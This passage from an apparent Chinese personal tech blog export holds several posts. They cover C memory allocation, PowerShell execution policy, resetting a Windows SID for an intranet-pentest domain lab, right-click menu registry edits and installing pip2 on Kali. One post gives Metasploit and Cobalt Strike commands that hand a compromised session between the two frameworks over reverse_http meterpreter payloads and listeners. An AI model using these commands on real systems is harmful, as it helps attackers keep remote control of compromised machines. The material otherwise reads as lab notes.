<p>一般地，对应每个malloc（）调用，应该调用一次free（）。<br><code>函数free（）的参数是先前malloc（）返问的地址</code>，它释放先前分配的内存。</p>
<p>这样，所分配内存的持续时间从调用malloc（）分配内存开始，到调用free（）释放内存以供再使用为止。</p>
<p>设想malloc（）和free（）管理着一个内存池。<br>每次调用malloc（）分配内存给程序使用，每次调用free（）将内存归还到池中，使内存可被再次使用。</p>
<blockquote>
<p>注意</p>
</blockquote>
<ul>
<li>free（）的参数应是一指针，指向由malloc（）分配的内存块；</li>
<li>其他方式（例如声明一个数组）分配的内存是不能使用free（）去释放的。</li>
</ul>
<p>在头文件stdlib.h中有malloc（）和free（）的原型。（我不知道，哈哈）</p>
<p>通过使用malloc（），程序可以在运行时决定需要多大的数组并创建它。</p>
<p>程序清单12.14 举例证明了这可能。</p>
<p>它把内存块地址赋给指针ptd，接着以使用数组名的方式使用ptd。</p>
<p>程序还调用了exit（）函数。该函数的原型在 stdlib.h 中，用来在内存分配失败时结束程序。</p>
<ul>
<li><p>值 EXIT_FAILURE 也在这个头文件中定义。标准库提供了两个保证能够在所有操作系统下工作的返回值：</p>
<p>EXIT SUCCESS（或者，等同于0）指示程序正常终止;</p>
<p>EXIT_FAILURE指示程序异常终止。</p>
</li>
</ul>
<p>另外，有些操作系统，包括UNIX、Linux 和Windows，能够接受其他的整数值。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>在编译程序时，静态变量的数量是固定的：在程序运行时也不改变。</p>
<p>自动变量使用的内存数量在程序执行时自动增加或者减少。<br>但被分配的内存所使用内存数量只会增加，除非您记得使用free（）。</p>
<blockquote>
<p>如果不适当使用，容易造成内存泄漏（memory leak）</p>
</blockquote>
<h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc()"></a>calloc()</h3><p>内存分配还可以使用calloc（）。</p>
<p>典型的应用如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> * newmen;</span><br><span class="line">newmen = (<span class="type">long</span> *) <span class="built_in">calloc</span> (<span class="number">100</span>, <span class="keyword">sizeof</span>( <span class="type">long</span>)); </span><br></pre></td></tr></table></figure></div>

<p>与 malloc（）类似，calloc（）在ANSI以前的版本中返回一个 char 指针，在ANSI中返回一个void指针。<br>如果要存储不同类型，应该使用类型指派运算符。<br>这个新函数接受两个参数，都应是无符号的整数（在ANSI中是size_t类型）。</p>
<p>第一个参数是<code>所需内存单元的数量</code>，第二个参数是<code>每个单元以字节计的大小</code>。</p>
<p>在这里，long使用4个字节，因此这一指令建立了100个4字节单元，总共使用400个字节来存储。</p>
<p>使用 sizeof（long）而不是 4 使代码更具可易移植性。<br>它可在其他系统中运行，这些系统中 long不是4字节而是别的大小。</p>
<p>函数calloc（）还有一个特性：相当于空数组初始化<br>它将块中的全部位都置为0（然而要注意，在某些硬件系统中，浮点值0不是用全部位为0来表示的）。</p>
<h3 id="动态内存分配与变长数组"><a href="#动态内存分配与变长数组" class="headerlink" title="动态内存分配与变长数组"></a>动态内存分配与变长数组</h3><p><code>变长数组（Variable-Length Array，VLA）</code>与<code>malloc（）</code>在功能上有些一致。例如，它们都可以用来创建一个大小在运行时决定的数组：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">valmal</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">int</span> * pi;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">pi = (<span class="type">int</span> *) <span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="type">int</span> ar[n];<span class="comment">//变长数组 </span></span><br><span class="line"></span><br><span class="line">pi[<span class="number">2</span>] = ar[<span class="number">2</span>] = <span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一个区别在于 VLA 是自动存储的。</p>
<p>自动存储的结果之一就是 VLA 所用内存空间在运行完定义部分之后会自动释放。</p>
<p>在本例中，就是函数 vlamal（）终止的时候。因此不必使用 free（）。</p>
<p>另一方面，使用由 malloc（）创建的数组不必局限在一个函数中。</p>
<p>例如，函数可以创建一个数组并返回指针，供调用该函数的函数访问。<br>接着，后者可以在它结束时调用 free（）。<br>free（）可以使用不同于 malloc（）指针的指针变量：必须一致的是指针中存储的地址。</p>
<p><code>VLA 对多维数组来说更方便。</code><br>您可以使用 malloc（）来定义一个二维数组，但语法很麻烦。<br>如果编译器不支持 VLA 特性，必须固定一维的大小，正如下面的函数调用：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> m = <span class="number">6</span>;</span><br><span class="line"><span class="type">int</span> ar2[n][m];<span class="comment">//n*m 的变长数组 </span></span><br><span class="line"><span class="type">int</span>(* p2) [<span class="number">6</span>];<span class="comment">//在c99之前可以使用 </span></span><br><span class="line"><span class="type">int</span>(* p3) [m];<span class="comment">//要求变长数组支持 </span></span><br><span class="line"></span><br><span class="line">p2 = (<span class="type">int</span> (*)<span class="number">6</span>) <span class="built_in">malloc</span> (n * <span class="number">6</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">// n*6 数组 </span></span><br><span class="line">p3 = (<span class="type">int</span> (*)[m]) <span class="built_in">malloc</span> (n * m * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">// n*m 数组 </span></span><br><span class="line"><span class="comment">//上面的表达式也要求变长数组支持 </span></span><br><span class="line"></span><br><span class="line">ar2[<span class="number">1</span>][<span class="number">2</span>] = p2[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">12</span>;</span><br></pre></td></tr></table></figure></div>
<p>有必要查看一下指针声明。函数malloc（）返回一个指针，因此p2必须是适当类型的指针。<br>下面的声明：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>(* p2) [<span class="number">6</span>];<span class="comment">//在c99之前可以使用</span></span><br></pre></td></tr></table></figure></div>

<p> 表明p2指向一个包含6个int值的数组。<br>这意味着p2将被解释为一个由6个整数构成的元素，p2[ i ][ j ]将是一个int值。</p>
<p>第二个指针声明使用变量来指定p3所指数组的大小。<br>这意味着p3将被看作<code>一个指向 VLA 的指针</code>，这正是代码不能在C90标准中运行的原因。</p>
<h3 id="内存类与动态内存分配"><a href="#内存类与动态内存分配" class="headerlink" title="内存类与动态内存分配"></a>内存类与动态内存分配</h3><p>您可能正在为存储类和动态内存分配之间的联系感到疑惑。</p>
<p>我们来看一个理想模型。<br>可以认为程序将它的可用内存分成了三个独立的部分：<br>一个是具有外部链接的、具有内部链接的以及具有空链接的静态变量的：<br>一个是自动变量的：<br>另一个是动态分配的内存的。<br><code>(静态变量)：</code><br>在编译时就已经知道了静态存储时期存储类变量所需的内存数量，存储在这一部分的数据在整个程序运行期间都可用。</p>
<p>这一类型的每个变量在程序开始时就已存在，到程序结束时终止。</p>
<p><code>(动态变量)：</code><br>然而，一个自动变量在程序进入包含该变量定义的代码块时产生，在退出这一代码块时终止。</p>
<p>因此，伴随着程序对函数的调用和终止，自动变量使用的内存数量也在增加和减少。</p>
<p>典型地，将这一部分内存处理为一个堆栈。</p>
<p>这意味着在内存中，新变量在创建时按顺序加入，在消亡时按相反顺序移除。</p>
<p><code>(动态内存分配)：</code><br>动态分配的内存在调用malloc（）或相关函数时产生，在调用free（）时释放。</p>
<p>由程序员而不是一系列固定的规则控制内存持续时间，因此内存块可在一个函数中创建，而在另一个函数中释放。(malloc 可以跨函数调用)</p>
<p>由于这点，动态内存分配所用的内存部分可能变成碎片状，也就是说，在活动的内存块之间散布着未使用的字节片。</p>
<p>不管怎样，使用动态内存往往导致进程比使用堆栈内存慢。</p>
]]></content>
      <categories>
        <category>C语言</category>
        <category>基础部分</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统powershell脚本运行策略</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/powershell%E8%BF%90%E8%A1%8C%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="powershell脚本运行策略"><a href="#powershell脚本运行策略" class="headerlink" title="powershell脚本运行策略"></a>powershell脚本运行策略</h2><p><strong>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</strong></p>
<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ExecutionPolicy </span><br></pre></td></tr></table></figure></div>

<p><strong>Unrestricted</strong>:权限最高，可以不受限制执行任何脚本</p>
<p>Default:为Powershell默认的策略</p>
<p>Restricted，不允许任何脚本执行</p>
<p>AllSigned：所有脚本都必须经过签名才能在运行</p>
<p>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</p>
<h3 id="改变运行策略"><a href="#改变运行策略" class="headerlink" title="改变运行策略"></a>改变运行策略</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统修改系统SID</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E4%BF%AE%E6%94%B9SID/</url>
    <content><![CDATA[<h1 id="修改SID"><a href="#修改SID" class="headerlink" title="修改SID"></a>修改SID</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>修改SID一般用在windows server机器上，做内网渗透搭建域环境时需要的，因为域环境不能有SID相同的机器</p>
<blockquote>
<p><strong>注意：用sysprep修改SID之后，系统会自动重启，之前配置好的网络、修改过的机器名会重置。所以，该操作需要在配置网络、修改机器名之前进行操作。</strong></p>
</blockquote>
<p>先找到<code>C:\Windows\System32\Sysprep</code>路径下的<code>sysprep.exe</code>工具，双击运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011102623.png"
                      alt="image-20240914011102623"
                ></p>
<p>勾选通用，点击确定</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011117051.png"
                      alt="image-20240914011117051"
                ></p>
<p>稍微等待一会，系统会重启</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011125163.png"
                      alt="image-20240914011125163"
                ></p>
<p>重启之后进入到配置界面</p>
<p>设置好密码，点击完成（密码可能要包含数字、字母、特殊符号三种才行）</p>
<p>查看系统的SID可以在cmd命令行下，输入<code>wmic useraccount get name,sid</code>命令进行查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011313526.png"
                      alt="image-20240914011313526"
                ></p>
<p>SID修改完成！</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>msf与cs派生会话</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/</url>
    <content><![CDATA[<h1 id="msf与cs派生会话"><a href="#msf与cs派生会话" class="headerlink" title="msf与cs派生会话"></a>msf与cs派生会话</h1><h2 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h2><h3 id="在CS中做好接口监听端口的准备"><a href="#在CS中做好接口监听端口的准备" class="headerlink" title="在CS中做好接口监听端口的准备"></a>在CS中做好接口监听端口的准备</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010145920.png"
                      alt="image-20240914010145920"
                ></p>
<h3 id="在MSF中添加转接exploit"><a href="#在MSF中添加转接exploit" class="headerlink" title="在MSF中添加转接exploit"></a>在MSF中添加转接exploit</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">background                // 挂起会话</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//payload各不相同，注意不要设置错了，这是32位的</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.16.181     //设置 CS 服务端的 IP 地址.</span><br><span class="line"><span class="built_in">set</span> lport 4400              //设置 CS 服务端的监听的端口</span><br><span class="line"><span class="built_in">set</span> pid xxxx	//设置程序的pid（可以不管，会自动生成一个）</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l  //查看 会话 是多少则设置多少</span><br><span class="line"><span class="built_in">set</span> session 1 [一般是 1(上面查看的结果)]</span><br><span class="line">exploit      // 进行测试</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010307684.png"
                      alt="image-20240914010307684"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010406568.png"
                      alt="image-20240914010406568"
                ></p>
<p>下面这个就是我们转接过去的beacon</p>
<h2 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h2><h3 id="在MSF中做好接口监听端口的准备"><a href="#在MSF中做好接口监听端口的准备" class="headerlink" title="在MSF中做好接口监听端口的准备"></a>在MSF中做好接口监听端口的准备</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914003204778.png"
                      alt="image-20240914003204778"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//这里要设置好，协议要与下面CS的协议用一样</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> lport 4445	//用于接收cs的派生会话</span><br><span class="line">run	//或者exploit</span><br></pre></td></tr></table></figure></div>

<h3 id="在CS中添加新监听"><a href="#在CS中添加新监听" class="headerlink" title="在CS中添加新监听"></a>在CS中添加新监听</h3><h4 id="添加payload为Foreign-HTTP，端口为MSF正在监听的端口"><a href="#添加payload为Foreign-HTTP，端口为MSF正在监听的端口" class="headerlink" title="添加payload为Foreign HTTP，端口为MSF正在监听的端口"></a>添加payload为Foreign HTTP，端口为MSF正在监听的端口</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913230933632.png"
                      alt="image-20240913230933632"
                ></p>
<h4 id="在beacon会话中运行"><a href="#在beacon会话中运行" class="headerlink" title="在beacon会话中运行"></a>在beacon会话中运行</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">spawn 监听器名</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004900523.png"
                      alt="image-20240914004900523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004917729.png"
                      alt="image-20240914004917729"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914005102622.png"
                      alt="image-20240914005102622"
                ></p>
<h4 id="或者在右键菜单中找到spawn进行派生会话"><a href="#或者在右键菜单中找到spawn进行派生会话" class="headerlink" title="或者在右键菜单中找到spawn进行派生会话"></a>或者在右键菜单中找到spawn进行派生会话</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913220809576.png"
                      alt="image-20240913220809576"
                ></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统右键菜单栏自定义添加程序</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="右键菜单栏自定义添加程序"><a href="#右键菜单栏自定义添加程序" class="headerlink" title="右键菜单栏自定义添加程序"></a>右键菜单栏自定义添加程序</h1><h2 id="右键菜单栏划分"><a href="#右键菜单栏划分" class="headerlink" title="右键菜单栏划分"></a>右键菜单栏划分</h2><ol>
<li><p>在空白处右键（桌面右键）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913213332631.png"
                      alt="image-20240913213332631"
                ></p>
</li>
<li><p>在文件上右键</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913213409634.png"
                      alt="image-20240913213409634"
                ></p>
</li>
<li><p>在文件夹上右键</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913213440530.png"
                      alt="image-20240913213440530"
                ></p>
</li>
</ol>
<h2 id="菜单栏对应注册表位置"><a href="#菜单栏对应注册表位置" class="headerlink" title="菜单栏对应注册表位置"></a>菜单栏对应注册表位置</h2><p>空白处右键： <code>HKEY_CLASSES_ROOT/Directory/background/shell</code></p>
<p>文件夹右键： <code>HKEY_CLASSES_ROOT/Directory/shell</code></p>
<p>文件上右键： <code>HKEY_CLASSES_ROOT/*/shell</code></p>
<h2 id="添加示例"><a href="#添加示例" class="headerlink" title="添加示例"></a>添加示例</h2><p><strong>这里以在文件上右键为例</strong></p>
<p>首先<code>win+R</code>输入<code>regedit</code>进入注册表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913213831309.png"
                      alt="image-20240913213831309"
                ></p>
<p>进入文件的右键操作目录<code>HKEY_CLASSES_ROOT/*/shell</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214022631.png"
                      alt="image-20240913214022631"
                ></p>
<p>右击<code>shell</code>，添加项，这个项就是你要添加的右键的文件目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214353893.png"
                      alt="image-20240913214353893"
                ></p>
<p>这里示例新建一个test项，在它的默认文件里面添加数值（双击），这个值是你右键添加的名字</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214527696.png"
                      alt="image-20240913214527696"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214650774.png"
                      alt="image-20240913214650774"
                ></p>
<p>再右击test项，添加一个 <code>字符串值</code>，命名为<code>icon</code>，<strong>只能命名为这个值</strong>，添加你想要的图标**路径 + 空格 + “%1”**，例如<code>C:/test.exe &quot;%1&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214827266.png"
                      alt="image-20240913214827266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913214915488.png"
                      alt="image-20240913214915488"
                ></p>
<p>最后在test项下面再添加一个项，命名为<code>command</code>，给它的默认值添加你要运行的软件的路径，如<code>C:/test.exe</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913215633160.png"
                      alt="image-20240913215633160"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/image-20240913215813847.png"
                      alt="image-20240913215813847"
                ></p>
<p>到这里就自定义完成了，其他的文件夹右键等同理操作，只是初目录不一样而已</p>
<h2 id="参考文案"><a href="#参考文案" class="headerlink" title="参考文案"></a>参考文案</h2><p><a class="link"   href="https://blog.csdn.net/Mrceel/article/details/107459678" >win10 给右键文件、文件夹、桌面菜单添加程序（项） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>kali环境下的pip2安装</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/pip2%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="pip2安装"><a href="#pip2安装" class="headerlink" title="pip2安装"></a>pip2安装</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>有些工具需要用到python2，但又需要pip下载包，而kali并没有自带pip2命令，所以需要手动安装pip2</strong></p>
<h2 id="1、安装setuptools-18-5（路径随便）"><a href="#1、安装setuptools-18-5（路径随便）" class="headerlink" title="1、安装setuptools-18.5（路径随便）"></a><strong>1、安装setuptools-18.5</strong>（路径随便）</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz //安装文件包</span><br><span class="line">//（可能会比较慢，可以通过物理机下载后传进去）</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222915609.png"
                      alt="image-20240913222915609"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//解压文件包然后进入目录</span><br><span class="line">tar -zxvf setuptools-18.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222940730.png"
                      alt="image-20240913222940730"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//用root权限安装依赖</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py build</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py install</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913223123209.png"
                      alt="image-20240913223123209"
                ></p>
<h2 id="2、安装pip2"><a href="#2、安装pip2" class="headerlink" title="2、安装pip2"></a>2、安装pip2</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py	//下载pip安装py包（可能会比较慢，可以通过物理机下载后传进去）</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py  </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224726285.png"
                      alt="image-20240913224726285"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224913728.png"
                      alt="image-20240913224913728"
                ></p>
<p><strong>此时可能会有报错，报错需要安装python2-dev（kali源已经更新的条件下）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install python2-dev</span><br></pre></td></tr></table></figure></div>

<p><strong>此时再执行<code>python2 get-pip.py</code>，就会继续安装</strong></p>
<p><strong>安装过程中会有读取超时的报错则需反复多试几次则可成功运行</strong></p>
<blockquote>
<p>猜测是访问网络问题导致超时</p>
</blockquote>
<h2 id="3、使用pip2安装模块"><a href="#3、使用pip2安装模块" class="headerlink" title="3、使用pip2安装模块"></a>3、使用pip2安装模块</h2><p>更换pip源（不安装源，反复执行也行，但速度非常慢，安装后运行速度会大大提升）</p>
<p>pip更新阿里云快速下载：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></div>

<p>pip更新清华源快速下载：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></div>

<h2 id="更新后的pip安装命令"><a href="#更新后的pip安装命令" class="headerlink" title="更新后的pip安装命令"></a>更新后的pip安装命令</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure></div>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://blog.csdn.net/huayimy/article/details/128338899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522188AE452-3D06-4121-8A1A-E9F40B09180A%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=188AE452-3D06-4121-8A1A-E9F40B09180A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128338899-null-null.nonecase&utm_term=pip2%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4450" >Kali Python2.7安装pip2和模块方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>C++提高编程部分总结</title>
    <url>/2024/10/25/C++/%E6%8F%90%E9%AB%98%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/</url>
